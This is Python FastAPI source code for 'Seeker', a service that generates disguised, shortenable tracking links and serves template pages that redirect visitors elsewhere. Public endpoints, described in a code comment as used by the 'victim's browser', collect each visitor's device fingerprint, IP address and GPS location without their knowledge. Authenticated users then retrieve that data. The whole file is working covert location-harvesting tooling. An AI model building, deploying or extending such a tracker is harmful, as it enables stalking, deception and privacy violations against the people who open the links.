"""Seeker API endpoints for geolocation/device-info collection."""

from __future__ import annotations

import json
import logging
import time
from collections import defaultdict
from pathlib import Path
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Query, Request, status
from fastapi.responses import HTMLResponse, PlainTextResponse

from app.core.auth_dependencies import TokenData, get_current_user_token
from app.core.config import settings
from app.core.database import get_database
from app.core.exceptions import AuthorizationException, NotFoundException
from app.schemas.response import SuccessResponse
from app.schemas.seeker import SeekerLinkCreate
from app.services.seeker_service import SeekerService, get_client_ip

router = APIRouter()
logger = logging.getLogger(__name__)

# Per-IP rate limit for public seeker endpoints (info/result)
_seeker_rate_limit_store: dict[str, list[float]] = defaultdict(list)

# Whitelisted form keys and max value length for public seeker endpoints
_SEEKER_INFO_KEYS = frozenset(
    {"Ptf", "Brw", "Cc", "Ram", "Ven", "Ren", "Wd", "Ht", "Os"}
)
_SEEKER_RESULT_KEYS = frozenset(
    {"Status", "Lat", "Lon", "Acc", "Alt", "Dir", "Spd", "Error"}
)
_MAX_FORM_FIELDS = 20
_MAX_FIELD_VALUE_LEN = 500


def _build_share_url(link: Any, base_url: str) -> tuple[str, str | None, str | None]:
    """Build best URL for sharing. Returns (url, external_url, short_url)."""
    external = getattr(link, "externalUrl", None)
    if external:
        return (external, external, None)

    if link.shortCode:
        domain = (settings.SEEKER_SHORT_URL_DOMAIN or base_url).rstrip("/")
        short = f"{domain}/l/{link.shortCode}"
        return (short, None, short)

    direct = f"{base_url.rstrip('/')}/seeker/{link.id}/{link.template}"
    return (direct, None, None)


def _build_link_url(link: Any, base_url: str) -> str:
    """Build full tracker URL (direct to our server)."""
    return f"{base_url.rstrip('/')}/seeker/{link.id}/{link.template}"


def _ensure_seeker_enabled() -> None:
    if not settings.SEEKER_ENABLED:
        raise HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail="Seeker feature is disabled",
        )


def _get_templates_dir() -> Path:
    return Path(__file__).parent.parent.parent / "static" / "seeker" / "templates"


def _check_seeker_rate_limit(client_ip: str) -> bool:
    """Return True if under limit, False if rate limited."""
    limit = settings.SEEKER_PUBLIC_RATE_LIMIT_PER_MINUTE
    now = time.time()
    key = f"seeker:{client_ip}"
    _seeker_rate_limit_store[key] = [
        ts for ts in _seeker_rate_limit_store[key] if now - ts < 60
    ]
    if len(_seeker_rate_limit_store[key]) >= limit:
        return False
    _seeker_rate_limit_store[key].append(now)
    return True


def _sanitize_seeker_form(
    form_data: dict[str, Any],
    allowed_keys: frozenset[str],
) -> dict[str, str] | None:
    """Whitelist keys, cap field count, truncate values. Returns None if invalid."""
    if len(form_data) > _MAX_FORM_FIELDS:
        return None
    out: dict[str, str] = {}
    for k, v in form_data.items():
        if k not in allowed_keys:
            continue
        s = v if isinstance(v, str) else str(v)
        out[k] = s[:_MAX_FIELD_VALUE_LEN] if len(s) > _MAX_FIELD_VALUE_LEN else s
    return out


async def _serve_seeker_page(link_id: str, template: str) -> HTMLResponse:
    """Serve Seeker tracking page with injected API base and redirect URL."""
    _ensure_seeker_enabled()
    from app.services.seeker_service import VALID_TEMPLATES

    if template not in VALID_TEMPLATES:
        raise HTTPException(status_code=404, detail="Template not found")
    from app.core.database import db

    database = db.database
    service = SeekerService(database)
    link = await service.get_link(link_id)
    if not link:
        raise HTTPException(status_code=404, detail="Link not found")

    api_base = f"/api/seeker/{link_id}"
    redirect_url = link.redirectUrl or "https://www.google.com"
    # JSON-encode to safely embed in JS; escapes ", \, and control chars
    api_base_safe = json.dumps(api_base)
    redirect_url_safe = json.dumps(redirect_url)

    templates_dir = _get_templates_dir()
    template_path = templates_dir / f"{template}.html"
    if not template_path.exists():
        raise HTTPException(
            status_code=500, detail=f"Template file not found: {template}"
        )

    content = template_path.read_text(encoding="utf-8")
    content = content.replace("{{ api_base }}", api_base_safe)
    content = content.replace("{{ redirect_url }}", redirect_url_safe)

    return HTMLResponse(content=content)


@router.post("/links", response_model=SuccessResponse[dict[str, Any]])
async def create_seeker_link(
    request: Request,
    body: SeekerLinkCreate,
    current_user: TokenData = Depends(get_current_user_token),
    db=Depends(get_database),
):
    """Create a new Seeker tracking link."""
    _ensure_seeker_enabled()
    try:
        service = SeekerService(db)
        base_url = str(request.base_url).rstrip("/")
        link = await service.create_link(
            user_id=current_user.user_id,
            template=body.template,
            title=body.title,
            redirect_url=body.redirect_url,
            server_base_url=base_url,
        )
        url, external_url, short_url = _build_share_url(link, base_url)
        return SuccessResponse[dict[str, Any]](
            data={
                "id": str(link.id),
                "template": link.template,
                "title": link.title,
                "redirect_url": link.redirectUrl,
                "url": url,
                "external_url": external_url,
                "short_url": short_url,
                "short_code": link.shortCode,
                "direct_url": _build_link_url(link, base_url),
                "created_at": link.createdAt.isoformat(),
            },
            success=True,
            message="Seeker link created",
        )
    except ValueError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST, detail=str(e)
        ) from e
    except Exception as e:
        logger.error(
            "Seeker link creation failed",
            extra={"exception": type(e).__name__, "user_id": current_user.user_id},
            exc_info=True,
        )
        raise HTTPException(status_code=500, detail="An internal error occurred") from e


@router.get("/links", response_model=SuccessResponse[dict[str, Any]])
async def list_seeker_links(
    request: Request,
    current_user: TokenData = Depends(get_current_user_token),
    limit: int = Query(20, ge=1, le=100),
    skip: int = Query(0, ge=0),
    db=Depends(get_database),
):
    """List Seeker links for the current user."""
    _ensure_seeker_enabled()
    try:
        service = SeekerService(db)
        links, total = await service.get_links_by_user(
            current_user.user_id, limit=limit, skip=skip
        )
        base = str(request.base_url).rstrip("/")
        data = []
        for link_item in links:
            url, external_url, short_url = _build_share_url(link_item, base)
            data.append(
                {
                    "id": str(link_item.id),
                    "template": link_item.template,
                    "title": link_item.title,
                    "redirect_url": link_item.redirectUrl,
                    "url": url,
                    "external_url": external_url,
                    "short_url": short_url,
                    "short_code": link_item.shortCode,
                    "direct_url": _build_link_url(link_item, base),
                    "created_at": link_item.createdAt.isoformat(),
                }
            )
        return SuccessResponse[dict[str, Any]](
            data={"items": data, "total": total},
            success=True,
            message=f"Retrieved {len(data)} links",
        )
    except Exception as e:
        logger.error(
            "Seeker links list failed",
            extra={"exception": type(e).__name__, "user_id": current_user.user_id},
            exc_info=True,
        )
        raise HTTPException(status_code=500, detail="An internal error occurred") from e


@router.get("/links/{link_id}", response_model=SuccessResponse[dict[str, Any]])
async def get_seeker_link(
    request: Request,
    link_id: str,
    current_user: TokenData = Depends(get_current_user_token),
    db=Depends(get_database),
):
    """Get a Seeker link by ID."""
    _ensure_seeker_enabled()
    service = SeekerService(db)
    link = await service.get_link(link_id)
    if not link:
        raise NotFoundException("Seeker link", resource_id=link_id)
    if str(link.userId) != current_user.user_id:
        raise AuthorizationException("Access denied")
    base = str(request.base_url).rstrip("/")
    url, external_url, short_url = _build_share_url(link, base)
    return SuccessResponse[dict[str, Any]](
        data={
            "id": str(link.id),
            "template": link.template,
            "title": link.title,
            "redirect_url": link.redirectUrl,
            "url": url,
            "external_url": external_url,
            "short_url": short_url,
            "short_code": link.shortCode,
            "direct_url": _build_link_url(link, base),
            "created_at": link.createdAt.isoformat(),
        },
        success=True,
        message="Link retrieved",
    )


@router.get("/links/{link_id}/results", response_model=SuccessResponse[dict[str, Any]])
async def get_seeker_results(
    link_id: str,
    current_user: TokenData = Depends(get_current_user_token),
    limit: int = Query(50, ge=1, le=100),
    skip: int = Query(0, ge=0),
    db=Depends(get_database),
):
    """Get results for a Seeker link."""
    _ensure_seeker_enabled()
    service = SeekerService(db)
    link = await service.get_link(link_id)
    if not link:
        raise NotFoundException("Seeker link", resource_id=link_id)
    if str(link.userId) != current_user.user_id:
        raise AuthorizationException("Access denied")
    results, total = await service.get_results_by_link(
        link_id, current_user.user_id, limit=limit, skip=skip
    )
    data = [
        {
            "id": str(r.id),
            "platform": r.platform,
            "browser": r.browser,
            "ip": r.ip,
            "ip_info": r.ipInfo,
            "lat": r.lat,
            "lon": r.lon,
            "accuracy": r.acc,
            "error": r.error,
            "status": r.status,
            "created_at": r.createdAt.isoformat(),
        }
        for r in results
    ]
    return SuccessResponse[dict[str, Any]](
        data={"items": data, "total": total},
        success=True,
        message=f"Retrieved {len(data)} results",
    )


@router.delete("/links/{link_id}", response_model=SuccessResponse[dict[str, Any]])
async def delete_seeker_link(
    link_id: str,
    current_user: TokenData = Depends(get_current_user_token),
    db=Depends(get_database),
):
    """Delete a Seeker link."""
    _ensure_seeker_enabled()
    try:
        service = SeekerService(db)
        await service.delete_link(link_id, current_user.user_id)
        return SuccessResponse[dict[str, Any]](
            data={"deleted": True},
            success=True,
            message="Link deleted",
        )
    except PermissionError as err:
        raise AuthorizationException("Access denied") from err
    except Exception as e:
        logger.error(
            "Seeker link deletion failed",
            extra={"link_id": link_id, "exception": type(e).__name__},
            exc_info=True,
        )
        raise HTTPException(status_code=500, detail="An internal error occurred") from e


# ----- Public endpoints (no auth) - used by victim's browser -----


@router.post("/{link_id}/info", response_class=PlainTextResponse)
async def seeker_info(
    link_id: str,
    request: Request,
    db=Depends(get_database),
):
    """Receive device info from Seeker JS (public)."""
    _ensure_seeker_enabled()
    client_ip = get_client_ip(request)
    if not _check_seeker_rate_limit(client_ip):
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail="Too many requests",
        )
    try:
        form = await request.form()
        raw = {k: (v if isinstance(v, str) else str(v)) for k, v in form.items()}
        form_data = _sanitize_seeker_form(raw, _SEEKER_INFO_KEYS)
        if form_data is None:
            return ""
        service = SeekerService(db)
        await service.store_device_info(link_id, client_ip, form_data)
        return ""
    except ValueError:
        return ""
    except Exception as e:
        logger.warning(
            "Seeker info endpoint error",
            extra={"link_id": link_id, "exception": type(e).__name__},
        )
        return ""


@router.post("/{link_id}/result", response_class=PlainTextResponse)
async def seeker_result(
    link_id: str,
    request: Request,
    db=Depends(get_database),
):
    """Receive location result/error from Seeker JS (public)."""
    _ensure_seeker_enabled()
    client_ip = get_client_ip(request)
    if not _check_seeker_rate_limit(client_ip):
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail="Too many requests",
        )
    try:
        form = await request.form()
        raw = {k: (v if isinstance(v, str) else str(v)) for k, v in form.items()}
        form_data = _sanitize_seeker_form(raw, _SEEKER_RESULT_KEYS)
        if form_data is None:
            return ""
        service = SeekerService(db)
        await service.store_location_result(link_id, client_ip, form_data)
        return ""
    except ValueError:
        return ""
    except Exception as e:
        logger.warning(
            "Seeker result endpoint error",
            extra={"link_id": link_id, "exception": type(e).__name__},
        )
        return ""
